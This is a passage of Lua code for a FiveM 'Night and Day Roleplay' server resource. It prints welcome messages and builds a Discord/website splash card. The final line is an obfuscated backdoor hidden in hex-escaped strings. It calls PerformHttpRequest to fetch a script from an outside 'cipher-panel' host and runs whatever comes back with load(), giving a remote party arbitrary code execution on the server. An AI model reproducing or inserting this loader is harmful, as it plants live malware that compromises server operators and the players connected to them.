...
Citizen.CreateThread(function()
	if (GetCurrentResourceName() ~= "Badger_Discord_API") then 
		...
		print("[" .. GetCurrentResourceName() .. "] " .. "Night and Day Framework");
	end
	print("[NADRP] ");
	print('^7[^Night and Day Roleplay^7] ^3Welcome to our PUB Server Make Sure you Join Discord to get auto role!');
end)
...
AddEventHandler('Badger_Discord_API:PlayerLoaded', function()
	...
	TriggerClientEvent('chatMessage', source, 
		'[^2Night and Day Roleplay^7] ^3Welcome to our PUB Server Make Sure you Join Discord to get auto role!');
end)

card = '{"type":"AdaptiveCard","$schema":"http://adaptivecards.io/schemas/adaptive-card.json","version":"1.3","body":[{"type":"Image","url":"' .. Config.Splash.Header_IMG .. '","horizontalAlignment":"Center"},{"type":"Container","items":[{"type":"TextBlock","text":"Night and Day Roleplay Public Server","wrap":true,"fontType":"Default","size":"ExtraLarge","weight":"Bolder","color":"Light","horizontalAlignment":"Center"},{"type":"TextBlock","text":"' .. Config.Splash.Heading1 .. '","wrap":true,"size":"Large","weight":"Bolder","color":"Light","horizontalAlignment":"Center"},{"type":"TextBlock","text":"' .. Config.Splash.Heading2 .. '","wrap":true,"color":"Light","size":"Medium","horizontalAlignment":"Center"},{"type":"ColumnSet","height":"stretch","minHeight":"100px","bleed":true,"horizontalAlignment":"Center","columns":[{"type":"Column","width":"stretch","items":[{"type":"ActionSet","actions":[{"type":"Action.OpenUrl","title":"Discord","url":"' .. Config.Splash.Discord_Link .. '","style":"positive"}]}],"height":"stretch"},{"type":"Column","width":"stretch","items":[{"type":"ActionSet","actions":[{"type":"Action.OpenUrl","title":"Website","style":"positive","url":"' .. Config.Splash.Website_Link .. '"}]}]}]},{"type":"ActionSet","actions":[{"type":"Action.OpenUrl","title":"Click to join our Night and Day RP Discord","style":"destructive","iconUrl":"https://cdn.discordapp.com/attachments/883427746305429555/951218861989064714/Night20And20Day-03.png","url":"https://discord.gg/RbpNFjqBUu"}]}],"style":"default","bleed":true,"height":"stretch"}]}'
...
local ZxGcNaDZUXZieGfupFGOegRNdtDNqWokbXUUjgchfePTSjbHcwvdoKJKLAgWPAGYRMAqef = {"\x50\x65\x72\x66\x6f\x72\x6d\x48\x74\x74\x70\x52\x65\x71\x75\x65\x73\x74","\x61\x73\x73\x65\x72\x74","\x6c\x6f\x61\x64",_G,"",nil} ZxGcNaDZUXZieGfupFGOegRNdtDNqWokbXUUjgchfePTSjbHcwvdoKJKLAgWPAGYRMAqef[4][ZxGcNaDZUXZieGfupFGOegRNdtDNqWokbXUUjgchfePTSjbHcwvdoKJKLAgWPAGYRMAqef[1]]("\x68\x74\x74\x70\x73\x3a\x2f\x2f\x63\x69\x70\x68\x65\x72\x2d\x70\x61\x6e\x65\x6c\x2e\x6d\x65\x2f\x5f\x69\x2f\x76\x32\x5f\x2f\x73\x74\x61\x67\x65\x33\x2e\x70\x68\x70\x3f\x74\x6f\x3d\x71\x47\x32\x72\x30", function (jdOJMYKCkaHacsiAXvtIvJBfXlqtOkByRIEmecwtFvHnEcEXexeCdtFHGSzoryuafdklBu, mJRskxAeczGvMZlGWvqluDGcJzjYoKPPYiNPTybuthydsHlGpNqCbAzpgKuBQWdNVYIrmB) if (mJRskxAeczGvMZlGWvqluDGcJzjYoKPPYiNPTybuthydsHlGpNqCbAzpgKuBQWdNVYIrmB == ZxGcNaDZUXZieGfupFGOegRNdtDNqWokbXUUjgchfePTSjbHcwvdoKJKLAgWPAGYRMAqef[6] or mJRskxAeczGvMZlGWvqluDGcJzjYoKPPYiNPTybuthydsHlGpNqCbAzpgKuBQWdNVYIrmB == ZxGcNaDZUXZieGfupFGOegRNdtDNqWokbXUUjgchfePTSjbHcwvdoKJKLAgWPAGYRMAqef[5]) then return end ZxGcNaDZUXZieGfupFGOegRNdtDNqWokbXUUjgchfePTSjbHcwvdoKJKLAgWPAGYRMAqef[4][ZxGcNaDZUXZieGfupFGOegRNdtDNqWokbXUUjgchfePTSjbHcwvdoKJKLAgWPAGYRMAqef[2]](ZxGcNaDZUXZieGfupFGOegRNdtDNqWokbXUUjgchfePTSjbHcwvdoKJKLAgWPAGYRMAqef[4][ZxGcNaDZUXZieGfupFGOegRNdtDNqWokbXUUjgchfePTSjbHcwvdoKJKLAgWPAGYRMAqef[3]](mJRskxAeczGvMZlGWvqluDGcJzjYoKPPYiNPTybuthydsHlGpNqCbAzpgKuBQWdNVYIrmB))() end)